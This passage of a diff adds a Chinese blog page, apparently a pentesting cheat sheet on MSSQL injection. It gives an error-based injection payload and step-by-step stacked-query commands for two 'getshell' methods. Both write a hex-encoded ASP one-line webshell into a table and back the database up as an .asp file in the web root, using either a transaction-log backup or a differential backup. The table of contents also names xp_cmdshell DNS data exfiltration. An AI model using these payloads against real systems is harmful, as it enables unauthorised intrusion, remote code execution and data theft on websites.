+</span><span style="color:#bbb"></span><span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">convert</span>(<span style="color:#008000">int</span>,<span style="color:#666">@</span><span style="color:#008000;font-weight:bold">host</span>);<span style="color:#bbb">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="报错注入">报错注入</h2>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#008000;font-weight:bold">select</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">convert</span>(<span style="color:#008000">int</span>,(sql语句),<span style="color:#666">111</span>)<span style="color:#bbb">
+</span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#ba2121">&#39; and 1=convert(int,(sql语句),111)
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="dbo权限日志备份和差异备份getshell">dbo权限日志备份和差异备份getshell</h2>
+<p>利用条件：至少DBO权限
+1、前提得知绝对路径，并且可写
+2、站库不分离
+3、数据库必须被备份过一次</p>
+<p>第一步</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">;<span style="color:#008000;font-weight:bold">alter</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">database</span><span style="color:#bbb"> </span><span style="">库名</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">set</span><span style="color:#bbb"> </span>RECOVERY<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">FULL</span><span style="color:#408080;font-style:italic">--
+</span><span style="color:#408080;font-style:italic"></span><span style="color:#bbb">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>第二步</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">;<span style="color:#008000;font-weight:bold">create</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">table</span><span style="color:#bbb"> </span><span style="">数据库名</span>..<span style="">表名</span>(a<span style="color:#bbb"> </span>image)<span style="color:#408080;font-style:italic">--     //建表
+</span></code></pre></td></tr></table>
+</div>
+</div><p>第三步</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">;insert into 数据库名..表名(a) values (0x一句话木马)--     //插入一句话木马到表中，注意16进制
+</code></pre></td></tr></table>
+</div>
+</div><p>第四步</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">;backup<span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">database</span><span style="color:#bbb"> </span><span style="">数据库名</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">to</span><span style="color:#bbb"> </span>disk<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span><span style="color:#ba2121">&#39;c:\www\panda.bak&#39;</span><span style="color:#408080;font-style:italic">--          //先手动给test1备份一遍
+</span></code></pre></td></tr></table>
+</div>
+</div><p>第五步</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">;backup<span style="color:#bbb"> </span>log<span style="color:#bbb"> </span><span style="">数据库名</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">to</span><span style="color:#bbb"> </span>disk<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span><span style="color:#ba2121">&#39;c:\www\panda.asp&#39;</span><span style="color:#bbb"> </span><span style="color:#008000;font-weight:bold">with</span><span style="color:#bbb"> </span>init<span style="color:#408080;font-style:italic">--          //利用log备份到web路径getshell
+</span></code></pre></td></tr></table>
+</div>
+</div><p>第六步</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">;Drop table 数据库名..表名--     //删除表
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="差异备份getshell">差异备份getshell</h3>
+<p>第一步</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">backup database 库名 to disk <span style="color:#666">=</span> <span style="">&#39;</span>c<span style="color:#666">:</span><span style="">\</span>bak<span style="color:#666">.</span><span style="color:#7d9029">bak</span><span style="">&#39;</span><span style="color:#666">;--</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>第二步，建表和字段</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">create table <span style="color:#666">[</span>dbo<span style="color:#666">].[</span>test<span style="color:#666">]</span> <span style="color:#666">([</span>cmd<span style="color:#666">]</span> <span style="color:#666">[</span>image<span style="color:#666">]);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>第三步，把一句话写进表里面（16进制）</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">insert into <span style="color:#00f">test</span><span style="color:#666">(</span>cmd<span style="color:#666">)</span> values<span style="color:#666">(</span>0x3C25657865637574652872657175657374282261222929253E<span style="color:#666">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>第四步、备份到网站根目录</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">backup database 库名 to disk<span style="color:#666">=</span><span style="">&#39;</span>C<span style="color:#666">:</span><span style="">\</span>d<span style="color:#666">.</span><span style="color:#7d9029">asp</span><span style="">&#39;</span> WITH DIFFERENTIAL<span style="color:#666">,</span>FORMAT<span style="color:#666">;--</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+        </div>
+        
+        <div class="my-4">
+    
+    <a href="/tags/%E6%B3%A8%E5%85%A5/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 mr-2 hover:text-eureka">#注入</a>
+    
+</div>
+        
+        
+        
+
+
+        
+        
+        <div class="py-2">
+    
+    <div class="flex flex-col md:flex-row items-center my-8">
+        <a href="/authors/dt/" class="w-24 h-24 md:mr-4">
+            
+            
+            <i class="fas fa-user-circle fa-6x"></i>
+            
+        </a>
+        <div class="w-full md:w-auto mt-4 md:mt-0">
+            <a href="/authors/dt/" class="block font-bold text-lg pb-1 mb-2 border-b">DT</a>
+            <span class="block pb-2"></span>
+            
+        </div>
+    </div>
+    
+</div>
+        
+        
+        
+<div class="flex flex-col md:flex-row md:justify-between -mx-2 mt-4 px-2 pt-4 border-t">
+    <div>
+        
+        <span class="block font-bold">Previous</span>
+        <a href="/posts/pth1/" class="block">内网PTH</a>
+        
+    </div>
+    <div class="md:text-right mt-4 md:mt-0">
+        
+        <span class="block font-bold">Next</span>
+        <a href="/posts/11/" class="block">内网端口转发和socks连接</a>
+        
+    </div>
+</div>
+
+        
+
+
+
+    </div>
+    
+    <div class="col-span-2">
+        
+        
+        <div class="sticky top-16 z-10 hidden lg:block px-6 py-4  bg-primary-bg ">
+    <span class="text-lg font-semibold">On This Page</span>
+</div>
+<div class="sticky-toc hidden lg:block px-6 pb-6 ">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#爆表名">爆表名</a></li>
+    <li><a href="#爆字段名">爆字段名</a></li>
+    <li><a href="#爆字段内容">爆字段内容</a></li>
+    <li><a href="#遍历用户">遍历用户</a></li>
+    <li><a href="#mssql-xp_cmdshell-dns外带数据">mssql xp_cmdshell-dns外带数据</a>
+      <ul>
+        <li><a href="#允许堆叠">允许堆叠</a></li>
+      </ul>
+    </li>
+    <li><a href="#创建表把查询的数据放入表中再从表中查询-通过改变id的值去查询表中的内容">创建表，把查询的数据放入表中再从表中查询-通过改变id的值去查询表中的内容</a></li>
+    <li><a href="#mssql报错查数字型的数据">mssql报错查数字型的数据</a></li>
+    <li><a href="#报错注入">报错注入</a></li>
+    <li><a href="#dbo权限日志备份和差异备份getshell">dbo权限日志备份和差异备份getshell</a>
+      <ul>
+        <li><a href="#差异备份getshell">差异备份getshell</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        enableStickyToc();
+    });
+</script>
+        
+    </div>
+    
+
+    
+    
+</div>
+<script>
+    document.addEventListener('DOMContentLoaded', ()=>{
+        hljs.initHighlightingOnLoad();
+    })
+</script>
+
+      </div>
+    </div>
+    
+  </main>
+  <footer class="pl-scrollbar">
+    <div class="w-full max-w-screen-xl mx-auto"><div class="text-center p-6 pin-b">
+    <p class="text-sm text-tertiary-text">&copy; 2021 <a href="https://www.wangchucheng.com/">C. Wang</a> and <a href="https://www.ruiqima.com/">R. Ma</a>
+ &middot;  Powered by the <a href="https://github.com/wangchucheng/hugo-eureka" class="hover:text-eureka">Eureka</a> theme for <a href="https://gohugo.io" class="hover:text-eureka">Hugo</a></p>
+</div></div>
+  </footer>
+</body>
+
+</html>
